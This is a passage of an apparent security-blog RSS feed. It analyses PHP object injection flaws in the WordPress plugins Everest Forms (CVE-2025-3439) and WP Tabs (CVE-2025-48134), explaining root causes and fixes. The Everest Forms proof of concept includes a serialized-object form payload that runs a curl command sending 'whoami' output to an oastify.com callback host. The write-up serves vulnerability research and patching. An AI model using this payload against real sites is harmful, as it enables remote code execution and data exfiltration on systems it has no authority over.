class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;&#xD;&#xA;A[&#34;User&amp;ensp;submits&amp;ensp;form&amp;ensp;â†’&amp;ensp;Data&amp;ensp;stored&amp;ensp;in&amp;ensp;$entry_meta&#34;]&amp;ensp;--&gt;&amp;ensp;B[&#34;Admin&amp;ensp;opens&amp;ensp;Entries&amp;ensp;page&amp;ensp;in&amp;ensp;wp-admin&#34;]&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C[&#34;entries_page()&amp;ensp;executed&#34;]&#xD;&#xA;C&amp;ensp;--&gt;&amp;ensp;D{&#34;GET[&#39;view-entry&#39;]&amp;ensp;exists?&#34;}&#xD;&#xA;D&amp;ensp;--&gt;|No|&amp;ensp;Z[&#34;Show&amp;ensp;entries&amp;ensp;table&#34;]&#xD;&#xA;D&amp;ensp;--&gt;|Yes|&amp;ensp;E[&#34;Load&amp;ensp;html-admin-page-entries-view.php&#34;]&#xD;&#xA;&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;F[&#34;foreach&amp;ensp;($entry_meta&amp;ensp;as&amp;ensp;meta_key&amp;ensp;=&gt;&amp;ensp;meta_value)&#34;]&#xD;&#xA;F&amp;ensp;--&gt;&amp;ensp;G{&#34;Is&amp;ensp;meta_value&amp;ensp;JSON?&#34;}&#xD;&#xA;G&amp;ensp;--&gt;|Yes|&amp;ensp;H[&#34;json_decode()&amp;ensp;â†’&amp;ensp;meta_value[&#39;value&#39;]&#34;]&#xD;&#xA;G&amp;ensp;--&gt;|No|&amp;ensp;I[&#34;meta_value&amp;ensp;=&amp;ensp;wp_strip_all_tags()&#34;]&#xD;&#xA;&#xD;&#xA;H&amp;ensp;--&gt;&amp;ensp;J[&#34;field_value&amp;ensp;=&amp;ensp;apply_filters(&#39;everest_forms_html_field_value&#39;,&amp;ensp;meta_value,&amp;ensp;...)&#34;]&#xD;&#xA;I&amp;ensp;--&gt;&amp;ensp;J&#xD;&#xA;&#xD;&#xA;J&amp;ensp;--&gt;&amp;ensp;K{&#34;field_value&amp;ensp;is&amp;ensp;serialized?&#34;}&#xD;&#xA;K&amp;ensp;--&gt;|No|&amp;ensp;L[&#34;Display&amp;ensp;value&amp;ensp;normally&#34;]&#xD;&#xA;K&amp;ensp;--&gt;|Yes|&amp;ensp;M[&#34;maybe_unserialize(field_value)&amp;ensp;â†&amp;ensp;Vulnerable&#34;]&#xD;&#xA;&#xD;&#xA;M&amp;ensp;--&gt;&amp;ensp;N{&#34;Unserialize&amp;ensp;produces&amp;ensp;object?&#34;}&#xD;&#xA;N&amp;ensp;--&gt;|Yes|&amp;ensp;R[&#34;Object&amp;ensp;Injection&amp;ensp;â†’&amp;ensp;Possible&amp;ensp;exploit&amp;ensp;if&amp;ensp;POP&amp;ensp;chain&amp;ensp;exists&#34;]&#xD;&#xA;N&amp;ensp;--&gt;|No|&amp;ensp;L&#xD;&#xA;&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a test class in &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;Evil&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$command&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ls&amp;ensp;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;fm&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Submit a form with JSON-encoded serialized payload:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;POST&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nn&#34;&gt;/2025/11/22/test/&lt;/span&gt;&amp;ensp;&lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;localhost&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;Content-Disposition:&amp;ensp;form-data;&amp;ensp;name=&amp;#34;everest_forms[form_fields][fullname]&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;{&amp;#34;value&amp;#34;:&amp;#34;a:1:{i:0;O:4:\&amp;#34;Evil\&amp;#34;:1:{s:7:\&amp;#34;command\&amp;#34;;s:74:\&amp;#34;curl&amp;ensp;http:\/\/3hl5b0qvv7r0okj81wizv1kmddj47uvj.oastify.com?leadked=$(whoami)\&amp;#34;;}}&amp;#34;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;------geckoformboundary8355bd6da3783bb27aa92837fe803a6e&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;...&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Administrator opens the entry:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-25-cve-2025-3439/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-11-25-cve-2025-3439/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-25-cve-2025-3439/result.png&#39; alt=&#34;Result&#34; height=&#34;614&#34; width=&#34;1119&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability exists because &lt;strong&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt; is used directly on user-supplied data without restricting which PHP classes may be instantiated&lt;/strong&gt;, leading to &lt;strong&gt;PHP Object Injection&lt;/strong&gt;. If a POP chain is present in another plugin or theme, an unauthenticated attacker may escalate to dangerous actions such as reading/writing/deleting files or even remote code execution.&#xA;The patch uses &lt;code&gt;evf_maybe_unserialize()&lt;/code&gt; with &lt;code&gt;allowed_classes&amp;ensp;=&amp;gt;&amp;ensp;false&lt;/code&gt;, fully neutralizing the issue.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Root cause&lt;/strong&gt;: Use of &lt;code&gt;maybe_unserialize()&lt;/code&gt; on user-controlled data without restricting classes.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Impact&lt;/strong&gt;: Object Injection, potentially RCE if a compatible POP chain exists.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Attack surface&lt;/strong&gt;: Triggered when an admin opens the Entries page; malicious payload is already stored.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Fix&lt;/strong&gt;: Use &lt;code&gt;unserialize()&lt;/code&gt; with &lt;code&gt;allowed_classes&amp;ensp;=&amp;ensp;false&lt;/code&gt;, preventing object creation.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Lesson learned&lt;/strong&gt;: Any unserialization must restrict allowed classes or switch to safer formats like JSON.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/everest-forms/vulnerability/wordpress-everest-forms-plugin-3-1-1-unauthenticated-php-object-injection-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Everest Forms Plugin &amp;lt;= 3.1.1 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-48134 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-24-cve-2025-48134/</link>
      <pubDate>Mon, 24 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-24-cve-2025-48134/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-24-cve-2025-48134/app.gif&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Deserialization of Untrusted Data&lt;/strong&gt; vulnerability in ShapedPlugin LLC WP Tabs allows &lt;strong&gt;Object Injection&lt;/strong&gt;. This issue affects WP Tabs from unspecified versions up to version 2.2.12.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-48134&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-48134&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.2.12&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.2.13&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-expand-tabs-free/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Tabs Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;WP Tabs&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.2.12&lt;/code&gt; â€“ &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.2.13&lt;/code&gt; â€“ &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; â†’ &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v2.2.12):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$sanitize_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;sanitize_and_collect_metabox_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;maybe_unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;{#ID#}&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$new_tabs_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this code, the &lt;strong&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt;&lt;/strong&gt; function is called directly on user data (&lt;code&gt;$value&lt;/code&gt; after replacing &lt;code&gt;&#39;{#ID#}&#39;&lt;/code&gt; with &lt;code&gt;$new_tabs_id&lt;/code&gt;). This creates a critical vulnerability:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Object Injection risk&lt;/strong&gt;: If an attacker injects a PHP object payload into base64 data, decoding and unserialization will instantiate the malicious object, leading to &lt;strong&gt;Object Injection&lt;/strong&gt; and potentially &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Lack of safety checks&lt;/strong&gt;: No validation is performed before unserializing.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;No fallback mechanism&lt;/strong&gt;: If the data is invalid or corrupted, the system has no alternative handling, making the application exploitable.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patch (v2.2.13):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a 